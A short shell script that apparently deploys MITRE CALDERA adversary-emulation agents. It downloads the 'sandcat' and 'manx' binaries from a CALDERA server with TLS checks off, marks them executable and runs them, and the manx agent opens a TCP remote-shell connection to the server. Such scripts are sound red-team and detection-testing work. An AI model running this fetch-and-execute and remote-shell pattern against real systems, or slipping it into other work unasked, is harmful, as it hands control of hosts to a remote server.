server=http://$CALDERA_SERVICE_HOST:$CALDERA_SERVICE_PORT_WEBUI;
agent=$(curl -svkOJ -X POST -H 'file:sandcat.go' -H 'platform:linux' -H "server:$server" $server/file/download 2>&1 | grep -i 'Content-Disposition' | grep -io 'filename=.*' | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null && ./$agent -server $server -v &
socket=$CALDERA_SERVICE_HOST:$CALDERA_SERVICE_PORT_TERMINAL;
contact="tcp";
manx=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $manx 2>/dev/null && ./$manx -http $server -socket $socket -contact $contact -v
